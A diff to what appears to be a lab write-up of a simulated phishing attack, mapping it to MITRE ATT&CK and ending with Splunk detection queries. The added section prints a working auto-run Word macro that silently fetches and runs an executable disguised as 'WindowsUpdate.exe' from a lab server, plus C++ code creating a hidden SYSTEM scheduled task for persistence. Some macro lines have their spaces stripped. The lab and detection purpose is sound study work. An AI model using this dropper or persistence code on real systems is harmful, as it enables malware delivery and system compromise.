@@ -876,6 +876,7 @@ In this scenario, we simulate a phishing attack where the attacker delivers a ma
     
     Collected data is sent back to the attacker via HTTP POST requests.
 
+---
 
 ### MITRE ATT&CK Mapping
 
@@ -891,10 +892,216 @@ In this scenario, we simulate a phishing attack where the attacker delivers a ma
 | **C2 Channel** | HTTP/HTTPS communication | **Application Layer Protocol (T1071.001)** | Network Logs / Proxy |
 | **Exfiltration** | Data sent via HTTP POST | **Exfiltration Over C2 Channel (T1041)** | PCAP / Network Monitoring |
 
+---
+
 ## Environment & Malware Setup
 
-$$blblblblblbblbllllllllblblblblblbbblbl%%
 
+In this section, we’ll walk through how the attack was actually built from the red team side.
+
+Nothing fancy… just a simple phishing chain:
+
+Word → Macro → PowerShell → Malware → C2
+
+---
+
+### Malicious Word Document & Macros
+
+So the initial access here was a **malicious Word document** with embedded macros.
+
+Once the victim opens the document and enables macros… everything starts.
+
+---
+
+#### Macro Code
+
+```
+SubDocument_Open()
+Macro1
+EndSub
+
+SubAutoOpen()
+Macro1
+EndSub
+
+SubMacro1()
+
+DimsavePathAsString
+savePath =Environ("TEMP")&"\\WindowsUpdate.exe"
+
+DimstrAsString
+str ="powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command ""(New-Object System.Net.WebClient).DownloadFile('http://192.168.61.128/WindowsUpdate.exe','"&savePath&"')"""
+
+Shellstr,vbHide
+
+Wait (5)
+
+IfDir(savePath)<>""Then
+ShellsavePath,vbHide
+EndIf
+
+EndSub
+
+SubWait(nAsLong)
+DimtAsDate
+t =Now
+Do
+DoEvents
+LoopUntilNow>=DateAdd("s",n,t)
+EndSub
+```
+
+---
+
+#### What’s going on here?
+
+### 1. **Auto Execution (Trigger)**
+
+```
+SubDocument_Open()
+SubAutoOpen()
+```
+
+These two make sure the macro runs automatically:
+
+- When the document is opened
+- Without user interaction (after enabling macros)
+
+So the moment the victim clicks **“Enable Content”**… it’s game over.
+
+---
+
+### 2. **Drop Location (Stealthy Path)**
+
+```
+savePath =Environ("TEMP")&"\\WindowsUpdate.exe"
+```
+
+- Uses `%TEMP%` directory → less suspicious
+- File name → `WindowsUpdate.exe` (looks legit)
+
+Classic trick to avoid raising attention.
+
+---
+
+### 3. **PowerShell Payload Execution**
+
+```
+powershell-WindowStyleHidden-ExecutionPolicyBypass
+```
+
+Let’s break this down:
+
+- `WindowStyle Hidden` → no visible window
+- `ExecutionPolicy Bypass` → ignore security restrictions
+- `System.Net.WebClient` → used to download the payload
+
+So basically:
+
+> “Go to attacker server and grab the malware silently”
+> 
+
+---
+
+### 4. **Download Stage (Payload Delivery)**
+
+```
+DownloadFile('http://192.168.61.128/WindowsUpdate.exe', savePath)
+```
+
+- Connects to attacker C2
+- Downloads the payload
+- Saves it locally
+
+---
+
+### 5. **Execution Stage**
+
+```
+Wait (5)
+
+IfDir(savePath)<>""Then
+ShellsavePath,vbHide
+EndIf
+```
+
+- Waits 5 seconds (just to make sure download finished)
+- Checks if file exists
+- Executes it silently
+
+---
+
+### Macro TL;DR
+
+- User opens Word file
+- Enables macros
+- Macro downloads malware
+- Executes it
+
+All silently… no UI… no warning… just vibes 😅
+
+<img width="1365" height="736" alt="Screenshot_11" src="https://github.com/user-attachments/assets/63f42723-7c82-4749-b9d7-b6f8caa583a3" />
+
+---
+
+# Malware (C++ Payload)
+
+This is the actual payload that gets dropped and executed.
+
+I reused the same malware from the previous scenario, but modified the **persistence technique** a bit.
+
+---
+
+### 2. **Persistence (Scheduled Task)**
+
+```cpp
+void EstablishTaskPersistence() {
+    char exePath[MAX_PATH];
+    GetModuleFileNameA(NULL, exePath, MAX_PATH);
+
+    string taskName = "WindowsUpdateTask";  
+
+   
+    string command = "schtasks /create /tn \"" + taskName + "\" /tr \"" + 
+                     string(exePath) + "\" /sc ONLOGON /ru SYSTEM /f /rl HIGHEST";
+
+   
+    ShellExecuteA(NULL, "open", "cmd.exe", 
+                  ("/c " + command).c_str(), 
+                  NULL, SW_HIDE);
+}
+```
+
+### Malware TL;DR
+
+- Establish persistence
+- Collect system info
+- Send data to C2
+- Repeat every 30 sec
+
+---
+
+# C2 Server Setup
+
+For this scenario, I reused the same C2 server from the previous use case.
+
+No need to reinvent the wheel 👀
+
+## C2 Behavior
+
+This Python script acts as a **simple HTTP listener**:
+
+- Listens on port `8080`
+- Receives POST requests from infected machines
+- Logs everything into a local file
+
+### C2 TL;DR
+
+- Acts as attacker server
+- Receives data from victim
+- Logs everything
+
+---
 
 ## Detection & Analysis
 
@@ -1146,7 +1353,7 @@ Yeah… classic **beaconing pattern** (and honestly, kinda noisy 😅)
 
 ---
 
-# Summary
+## Summary
 
 ### What Happened (Timeline)
 
@@ -1172,11 +1379,11 @@ Yeah… classic **beaconing pattern** (and honestly, kinda noisy 😅)
 
 ---
 
-# (SIEM / Detection Engineering)
+### (SIEM / Detection Engineering)
 
 The Sigma rules above can be converted into SIEM queries.
 
-### Example (Splunk):
+#### Example (Splunk):
 
 ```
 index=* EventCode=1 Image="*powershell.exe*" CommandLine="*DownloadFile*"
